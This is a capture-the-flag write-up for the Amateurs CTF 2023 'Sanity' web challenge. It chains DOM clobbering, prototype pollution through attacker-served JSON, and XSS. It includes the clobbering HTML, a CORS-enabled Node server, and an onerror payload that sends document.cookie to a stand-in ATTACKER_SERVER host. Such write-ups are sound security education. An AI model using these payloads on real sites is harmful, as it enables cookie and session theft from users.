---
name: Sanity (2023)
event: Amateurs CTF 2023
category: Web
description: Writeup for Sanity (Web) - Amateurs CTF (2023) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Sanity

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/AO7CDquZ690/0.jpg)](https://youtu.be/AO7CDquZ690 "DOM Clobbering, Prototype Pollution and XSS")

## Description

> check out this pastebin! its a great way to store pieces of your sanity between ctfs.

## Recon

We visit the challenge URL: https://sanity.amt.rs and find two textboxes (`title` and `paste`).

Trying some basic XSS payloads is fruitless but the source is included, so let's inspect it for vulnerabilities!

#### index.js

{% code overflow="wrap" %}
```js
import express from "express";
import bodyParser from "body-parser";
import { nanoid } from "nanoid";
import path from "path";
import puppeteer from "puppeteer";

const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

const __dirname = path.resolve(path.dirname(""));
const app = express();
const port = 3000;

app.set("view engine", "ejs");
app.use(bodyParser.json());

const browser = puppeteer.launch({
    pipe: true,
    args: ["--no-sandbox", "--disable-dev-shm-usage"],
});
const sanes = new Map();

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, `/index.html`));
});

app.post("/submit", (req, res) => {
    const id = nanoid();
    if (!req.body.title) return res.status(400).send("no title");
    if (req.body.title.length > 100)
        return res.status(400).send("title too long");
    if (!req.body.body) return res.status(400).send("no body");
    if (req.body.body.length > 2000)
        return res.status(400).send("body too long");

    sanes.set(id, req.body);

    res.send(id);
});

app.get("/:sane", (req, res) => {
    const sane = sanes.get(req.params.sane);
    if (!sane) return res.status(404).send("not found");

    res.render("sanes", {
        id: req.params.sane,
        title: encodeURIComponent(sane.title),
        body: encodeURIComponent(sane.body),
    });
});

app.get("/report/:sane", async (req, res) => {
    let ctx;
    try {
        ctx = await (await browser).createIncognitoBrowserContext();
        const visit = async (browser, sane) => {
            const page = await browser.newPage();
            await page.goto("http://localhost:3000");
            await page.setCookie({ name: "flag", value: process.env.FLAG });
            await page.goto(`http://localhost:3000/${sane}`);
            await page.waitForNetworkIdle({ timeout: 5000 });
            await page.close();
        };

        await Promise.race([visit(ctx, req.params.sane), sleep(10_000)]);
    } catch (err) {
        console.error("Handler error", err);
        if (ctx) {
            try {
                await ctx.close();
            } catch (e) {}
        }
        return res.send("Error visiting page");
    }
    if (ctx) {
        try {
            await ctx.close();
        } catch (e) {}
    }
    return res.send("Successfully reported!");
});

app.listen(port, () => {
    console.log(`Example app listening on port ${port}`);
});
```
{% endcode %}

#### sanes.ejs

{% code overflow="wrap" %}
```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>sanity - <%= title %></title>
    </head>

    <body>
        <h1 id="title">
            <script>
                const sanitizer = new Sanitizer();
                document
                    .getElementById("title")
                    .setHTML(decodeURIComponent(`<%- title %>`), { sanitizer });
            </script>
        </h1>
        <div id="paste">
            <script>
                class Debug {
                    #sanitize;
                    constructor(sanitize = true) {
                        this.#sanitize = sanitize;
                    }

                    get sanitize() {
                        return this.#sanitize;
                    }
                }

                async function loadBody() {
                    let extension = null;
                    if (window.debug?.extension) {
                        let res = await fetch(
                            window.debug?.extension.toString()
                        );
                        extension = await res.json();
                    }

                    const debug = Object.assign(
                        new Debug(true),
                        extension ?? { report: true }
                    );
                    let body = decodeURIComponent(`<%- body %>`);
                    if (debug.report) {
                        const reportLink = document.createElement("a");
                        reportLink.innerHTML = `Report <%= id %>`;
                        reportLink.href = `report/<%= id %>`;
                        reportLink.style.marginTop = "1rem";
                        reportLink.style.display = "block";

                        document.body.appendChild(reportLink);
                    }

                    if (debug.sanitize) {
                        document
                            .getElementById("paste")
                            .setHTML(body, { sanitizer });
                    } else {
                        document.getElementById("paste").innerHTML = body;
                    }
                }

                loadBody();
            </script>
        </div>
    </body>
</html>
```
{% endcode %}

## Attack Plan

Let's breakdown our attack plan, in reverse order.

Our ultimate goal is to steal the admin's cookie 🍪

We can see from the code in `index.js`, they will access the challenge domain and set a cookie containing the flag. Next, they will visit our note.

{% code overflow="wrap" %}
```js
await page.goto("http://localhost:3000");
await page.setCookie({ name: "flag", value: process.env.FLAG });
await page.goto(`http://localhost:3000/${sane}`);
```
{% endcode %}

So how can we trigger the XSS? If we look at line 50 in `sane.ejs`, we'll see that a `sanitizer` will sanitize our payload _unless_ `debug.sanitize` is false.

{% code overflow="wrap" %}
```js
if (debug.sanitize) {
    document.getElementById("paste").setHTML(body, { sanitizer });
} else {
    document.getElementById("paste").innerHTML = body;
}
```
{% endcode %}

This brings us onto the next problem; `sanitize` is set to `true` by default in the class declaration on line 20.

{% code overflow="wrap" %}
```js
class Debug {
    #sanitize;
    constructor(sanitize = true) {
        this.#sanitize = sanitize;
    }

    get sanitize() {
        return this.#sanitize;
    }
}
```
{% endcode %}

The \[constant\] `debug` object is instantiated on line 38, where it is also set to `true`.

{% code overflow="wrap" %}
```js
const debug = Object.assign(new Debug(true), extension ?? { report: true });
```
{% endcode %}

According to this line of code, if `extension` is defined (not null) then a new `debug` object will be created which has properties from both the `Debug(true)` instance and the `extension` object.

If `extension` is null then the object will instead have the properties from `Debug(true)` and an additional property: `report: true`.

So, if we could control `extension`, we could potentially use [Prototype Pollution](https://learn.snyk.io/lesson/prototype-pollution) to pollute the prototype of all objects to contain a property: `sanitize: false`.

We look through the code to find where extension is assigned, there's a function at line 31.

{% code overflow="wrap" %}
```js
async function loadBody() {
    let extension = null;
    if (window.debug?.extension) {
        let res = await fetch(window.debug?.extension.toString());
        extension = await res.json();
    }
```
{% endcode %}

Extension is set to null! It then checks for `window.debug.extension` and if exists, makes a HTTP request to that URL and sets extension to contain the response, which is expected to be JSON data.

If we try and submit some benign text and check with devtools (F12 🚔) , the console shows the following.

{% code overflow="wrap" %}
```js
>> window.debug
<- undefined
```
{% endcode %}

This brings us on to our final (technically first) vulnerability; [DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)

> DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behaviour of JavaScript on the page. DOM clobbering is particularly useful in cases where [XSS](https://portswigger.net/web-security/cross-site-scripting) is not possible, but you can control some HTML on a page where the attributes `id` or `name` are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.

We have a script on line 15 (right after the sanitizer instantiation)

{% code overflow="wrap" %}
```js
document
    .getElementById("title")
    .setHTML(decodeURIComponent(`<%- title %>`), { sanitizer });
```
{% endcode %}

It's calling `setHTML` on our input, so we can inject HTML. There is a sanitizer active (with [default configuration](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer/sanitize)) but it only `"strips out XSS-relevant input by default"` so the [sanitized setHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/setHTML) leaves us a lot of room to accomplish our goal.

More resources on DOM Clobbering here:

-   [DOM Clobbering Intro](https://medium.com/@ibm_ptc_security/dom-clobbering-baa55c208bce)
-   [DOMClob.xyz](https://domclob.xyz)
-   [YouTube: It’s (DOM) Clobbering Time: Attack Techniques, Prevalence, and Defenses](https://www.youtube.com/watch?v=_F4MZpy89_s)
-   [HackTricks: DOM Clobbering](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)

## Solution

We've established the attack plan:

1. `CLOBBER`: we need to clobber the DOM so that `window.debug.extension` contains a URL.
2. `POLLUTE`: the URL should deliver a JSON object, which pollutes `__proto__` with `sanitizer: false`.
3. `INJECT`: with `debug.sanitize`, we can inject an XSS payload into the `paste` field. It will be injected into the page HTML, _without sanitization_.

Once we've successfully chained these vulns, we can send the report to the admin and wait for our cookie 🚩

### Browser issue detour

I got stuck for a little while trying to put this attack together, until I remembered the recent [Intigriti challenge](https://www.youtube.com/watch?v=Marqe2SEYok) that used `Sanitizer()`. In this challenge, players were advised to test on Google Chrome, whereas I am using Firefox 🦊

I thought; no worries, just like in that video writeup, we can manually enable Sanitizer by going to `about:config` and setting `dom.security.sanitizer.enabled` to `true`.

Once that was enabled, HTML injection worked! Submitting the following payload as the `title` and `paste` values, produced **bold** output 🔥

{% code overflow="wrap" %}
```html
<b>420</b>
```
{% endcode %}

Unfortunately, I got stuck again at the next step and switching to Chrome solved it (you might want to do the same, if you're having issues).

### Part 1: DOM Clobbering

We review some of the earlier documentation, or use this awesome [DOMC Payload Generator](https://domclob.xyz/domc_payload_generator)

{% code overflow="wrap" %}
```txt
target: debug.extension
value: //ATTACKER_SERVER
```
{% endcode %}

We can try the various payloads and each time check the value of `window.debug.extension` in the console.

{% code overflow="wrap" %}
```html
<a id="debug"></a><a id="debug" name="extension" href="//ATTACKER_SERVER"></a>
```
{% endcode %}

{% code overflow="wrap" %}
```js
>> window.debug.extension.toString()
<- 'https://attacker_server'
```
{% endcode %}

Perfect! So we know that

{% code overflow="wrap" %}
```js
fetch(window.debug?.extension.toString());
```
{% endcode %}

will actually be

{% code overflow="wrap" %}
```js
fetch("https://attacker_server");
```
{% endcode %}

Side note: The [official solution](https://gist.github.com/voxxal/fb69443f0a31bc6f2ddbce763d609935#sanity) from the challenge author used a different technique. By specifying the `data` value, they were able to assign the desired JSON object directly.

{% code overflow="wrap" %}
```js
<a id=debug><a id=debug name=extension href='data:;,{"report": true}'>
```
{% endcode %}

If, like me, you were using a `SimpleHTTPServer` with python, exposed via `ngrok` then you'll notice you didn't receive a request.

Checking the console again, you'll see why.

> Access to fetch at `https://ATTACKER_SERVER/` from origin `https://sanity.amt.rs` has been blocked by `CORS` policy: **No 'Access-Control-Allow-Origin' header is present on the requested resource**. If an opaque response serves your needs, set the request's mode to 'no-cors' to fetch the resource with CORS disabled.

There's various ways we can add this header, e.g. launching `ngrok` with `--request-header-add "Access-Control-Allow-Origin: *"`.

In this case, I used a `nodejs` app (exposed via `ngrok`).

{% code overflow="wrap" %}
```js
const http = require("http");

const server = http.createServer((req, res) => {
    // Set the Access-Control-Allow-Origin header to allow requests from any origin
    res.setHeader("Access-Control-Allow-Origin", "*");

    // Send the response
    res.end("{}");
});

const port = 3000;
server.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});
```
{% endcode %}

Now, when we refresh the page, our server gets a hit! However, when we check the report, there is no longer a report link 🤔

If we review the code again, the missing report link situation should be quite obvious.

{% code overflow="wrap" %}
```js
const debug = Object.assign(new Debug(true), extension ?? { report: true });
```
{% endcode %}

So, if extension exists, the `debug` object will be assigned it's properties (else, `report: true`). That has happened, but the JSON object sent by our server is currently `{}`.

Therefore, the properties of `debug` simply mirror the `Debug` class, the `debug.report` condition returns false and the report link is never created.

{% code overflow="wrap" %}
```js
if (debug.report) {
    const reportLink = document.createElement("a");
    reportLink.innerHTML = `Report <%= id %>`;
    reportLink.href = `report/<%= id %>`;
    reportLink.style.marginTop = "1rem";
    reportLink.style.display = "block";

    document.body.appendChild(reportLink);
}
```
{% endcode %}

Since we control the properties of extension, let's change the line in our server code to the following.

{% code overflow="wrap" %}
```js
res.end('{"report": true}');
```
{% endcode %}

Now, when we restart the server, our report link is generated! We add a simple XSS to the paste field (`<script>` won't work with `innerHTML` though, these tags only load when the page loads).

{% code overflow="wrap" %}
```html
<img src="x" onerror="alert(1)" />
```
{% endcode %}

The alert doesn't trigger, so let's move on to the next stage!

### Part 2: Prototype Pollution

The idea here is to pollute `__proto__` with the desired `key:value` pairs so that every object will inherit them. Change the line to the following.

{% code overflow="wrap" %}
```js
res.end('{"__proto__": {"sanitize": false, "report": true}}');
```
{% endcode %}

When I check the debugger again, `sanitize` is still not false. I really thought this worked for me yesterday, using the same payloads 🤷‍♂️

Regardless, the alert is popped! Since `sanitize` doesn't seem to matter, let's try without it.

{% code overflow="wrap" %}
```js
res.end('{"__proto__": {"report": true}}');
```
{% endcode %}

Yep, it works! I tried a few variations to disable the sanitizer but didn't get there.

I check with ChatGPT 🤓

> The # before sanitize signifies that sanitize is a private class field, a feature introduced in JavaScript with the ECMAScript 2019 (ES10) specification. Private class fields are denoted by the # symbol followed by the field name, and they are only accessible within the class in which they are defined

> private class fields are not accessible outside the class where they are defined. They are not part of the prototype chain and cannot be modified or accessed from external code. This means that the `#sanitize` field in the `Debug` class is not susceptible to prototype pollution.

OK, I guess I can't change it? 🤔 But.. if `debug.sanitize` is always true, why did the challenge dev add an if statement here at all? Guess I'll have to check smarter peoples writeups 😁

edit: After speaking with the challenge creator and playing around with the challenge again, it turns out any form of prototype pollution is enough, e.g. sending an empty object will work just fine. Presumably this overwrites the existing object, making `sanitize` undefined so that the if condition doesn't trigger 🤷‍♂️

{% code overflow="wrap" %}
```js
res.end('{"__proto__": {}}');
```
{% endcode %}

### Part 3: XSS

You can probably find many payloads to extract the flag, but I went with this one.

{% code overflow="wrap" %}
```js
<img src=x onerror=document.location='http://ATTACKER_SERVER/?'+document.cookie;>
```
{% endcode %}

Upon loading, the page will try to display the image `x`. Since that's not a valid `img src`, it will trigger an error and execute some JS to redirect the victim to the attacker server (us) with their cookie attached as a GET parameter.

If we submit the report to the admin and check our `ngrok` output (make sure to do this on the web UI), we'll find our flag 🔥

Flag: `amateursCTF{s@nit1zer_ap1_pr3tty_go0d_but_not_p3rf3ct}`

Side note: I actually forgot to submit the flag, so our team did not solve the challenge 🙃
